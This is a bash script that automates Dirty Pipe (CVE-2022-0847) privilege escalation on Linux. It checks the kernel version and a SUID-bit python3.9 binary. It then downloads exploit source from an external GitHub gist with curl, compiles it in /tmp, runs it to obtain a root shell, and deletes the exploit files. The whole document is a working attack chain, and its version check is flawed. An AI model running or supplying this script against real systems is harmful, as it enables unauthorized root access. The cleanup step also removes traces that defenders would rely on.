#!/bin/bash
#
# Dirty Pipe (CVE-2022-0847) Privilege Escalation Automation Bash Script

# Array containing non-vulnerable/patched kernel versions
notvulnerable=(4.9 5.8 5.10.102 5.14.10 5.15.25 5.15.34 5.16.11 5.16.12 5.17)

# Get kernel version of system
echo "[*] Checking if kernel version is vulnerable to Dirty Pipe..."
kernel_version=$(uname -r | cut -d '-' -f1)
echo "[*] Kernel version = $kernel_version"

# Checks if the kernel version is vulnerable to Dirty Pipe
if [[ "${notvulnerable[*]}" = $kernel_version ]]; 
    then
        # If not vulnerable, terminate the script
        echo "[!] This kernel version is not vulnerable to Dirty Pipe! Terminating script..."
        exit 0
    else
        echo "[+] This kernel version is vulnerable to Dirty Pipe!"

        # Checks if /usr/bin/sudo has SUID bit set
        echo "[*] Checking if SUID bit is set on /usr/bin/python3.9..."
        if [[ "$(find / -perm -4000 2>/dev/null)" =~ "/usr/bin/python3.9" ]];
            then
                echo "[+] SUID bit is set on /usr/bin/python3.9!"

                # Grab a copy of the exploit code from GitHub and store it in /tmp directory
                echo "[*] Grabbing a copy of the exploit code from GitHub..."
                curl -s https://gist.githubusercontent.com/real-yj/9f336bbfeecd1158da14dfec9d3e2250/raw/7973f5a56a54f0305a630c641c010bc818e4e7f5/CVE-2022-0847.c > /tmp/CVE-2022-0847.c 
                
                # Compile exploit and set execute permission on the executable
                echo "[*] Compiling exploit..."
                cd /tmp && gcc CVE-2022-0847.c -o CVE-2022-0847
                chmod +x CVE-2022-0847
                echo "[+] Exploit successfully compiled and execute permission set!"

                # Execute the exploit to get a root shell and run commands. Perform cleanup at the end.
                echo "[*] Executing the Dirty Pipe exploit to run commands in root shell..."
                echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/python3.9
                echo "[+] All commands have been executed!"

            else
                # If SUID bit is not set on /usr/bin/sudo, terminate the script
                echo "[!] SUID bit is not set on /usr/bin/python3.9! Terminating script..."
                exit 0
        
        fi
fi